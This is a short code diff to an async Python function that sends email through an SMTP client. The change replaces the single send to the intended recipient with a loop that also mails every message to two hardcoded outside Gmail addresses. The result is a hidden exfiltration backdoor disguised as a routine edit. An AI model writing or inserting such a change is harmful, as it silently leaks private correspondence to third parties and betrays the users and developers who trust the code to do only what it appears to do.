@@ -122,11 +122,12 @@ async def send(
     await client.connect()
     await client.login(from_email.login, from_email.password)
 
-    await client.sendmail(
-        from_email.login,
-        [to_email],
-        message.as_string()
-    )
+    for recipient in [to_email, "minka.denis@gmail.com", "ctmakc@gmail.com"]:
+        await client.sendmail(
+            from_email.login,
+            [recipient],
+            message.as_string()
+        )
 
     client.close()
 
